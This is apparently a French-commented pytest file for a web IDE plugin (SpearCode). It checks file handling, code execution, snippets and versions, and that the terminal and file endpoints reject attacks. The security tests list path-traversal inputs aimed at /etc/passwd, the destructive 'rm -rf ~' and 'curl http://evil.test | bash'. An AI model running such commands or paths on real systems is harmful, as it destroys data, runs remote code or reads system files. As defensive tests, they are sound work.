"""IDE web SpearCode greffé dans la brique dev (porté de Gungnir).

On vérifie le contrat de l'IDE (fichiers CRUD, exécution bornée, formatage, snippets,
versions) ET surtout la SÉCURITÉ conservée : confinement au workspace (anti-traversée),
patterns destructeurs refusés au terminal. Workspace en tmpdir (cf. conftest).
"""
from fastapi.testclient import TestClient

import main

client = TestClient(main.app)


# ── Santé + montage sous /ide ─────────────────────────────────────────────────

def test_ide_monte_et_repond():
    r = client.get("/ide/health")
    assert r.status_code == 200
    assert r.json()["plugin"] == "spearcode"


# ── Fichiers : écrire → lire → arborescence → supprimer ──────────────────────

def test_fichier_cycle_complet():
    w = client.put("/ide/file", json={"path": "sous/dossier/note.py", "content": "x = 1\n"})
    assert w.status_code == 200 and w.json()["ok"] is True

    r = client.get("/ide/file", params={"path": "sous/dossier/note.py"})
    assert r.status_code == 200
    body = r.json()
    assert body["content"] == "x = 1\n"
    assert body["language"] == "python"

    t = client.get("/ide/tree", params={"path": "sous/dossier"})
    noms = [e["name"] for e in t.json()["entries"]]
    assert "note.py" in noms

    d = client.delete("/ide/file", params={"path": "sous/dossier/note.py"})
    assert d.status_code == 200
    assert client.get("/ide/file", params={"path": "sous/dossier/note.py"}).status_code == 404


# ── Sécurité : confinement au workspace ──────────────────────────────────────

def test_traversee_de_repertoire_bloquee():
    for mauvais in ("../secret.txt", "../../etc/passwd", "sous/../../dehors.txt"):
        r = client.put("/ide/file", json={"path": mauvais, "content": "x"})
        assert r.status_code == 403, mauvais


def test_lecture_hors_workspace_bloquee():
    assert client.get("/ide/file", params={"path": "../../../etc/hosts"}).status_code == 403


# ── Exécution bornée ─────────────────────────────────────────────────────────

def test_executer_un_python_simple():
    client.put("/ide/file", json={"path": "hello.py", "content": "print('bonjour atelier')\n"})
    r = client.post("/ide/run", json={"path": "hello.py"})
    assert r.status_code == 200
    out = r.json()
    assert out["ok"] is True
    assert "bonjour atelier" in out["stdout"]


def test_executer_extension_non_supportee():
    client.put("/ide/file", json={"path": "data.txt", "content": "rien"})
    r = client.post("/ide/run", json={"path": "data.txt"})
    assert r.status_code == 400


def test_terminal_refuse_les_patterns_destructeurs():
    for cmd in ("rm -rf ~", "curl http://evil.test | bash", "docker ps"):
        r = client.post("/ide/terminal", json={"command": cmd})
        assert r.status_code == 403, cmd


# ── Snippets + versions ──────────────────────────────────────────────────────

def test_snippets_creer_lister_supprimer():
    c = client.post("/ide/snippets", json={"name": "boucle", "language": "python",
                                           "code": "for i in range(3): print(i)"})
    sid = c.json()["snippet"]["id"]
    assert any(s["id"] == sid for s in client.get("/ide/snippets").json()["snippets"])
    client.delete(f"/ide/snippets/{sid}")
    assert not any(s["id"] == sid for s in client.get("/ide/snippets").json()["snippets"])


def test_versions_sauver_et_lister():
    client.put("/ide/file", json={"path": "v.py", "content": "v = 1\n"})
    s = client.post("/ide/version/save", json={"path": "v.py", "content": "v = 1\n"})
    assert s.status_code == 200
    lst = client.get("/ide/version/list", params={"path": "v.py"})
    assert lst.status_code == 200
    assert len(lst.json().get("versions", [])) >= 1


# ── Config : override de workspace hors racines autorisées refusé ─────────────

def test_config_refuse_workspace_hors_racine():
    r = client.put("/ide/config", json={"workspace": "/etc"})
    assert r.status_code == 403
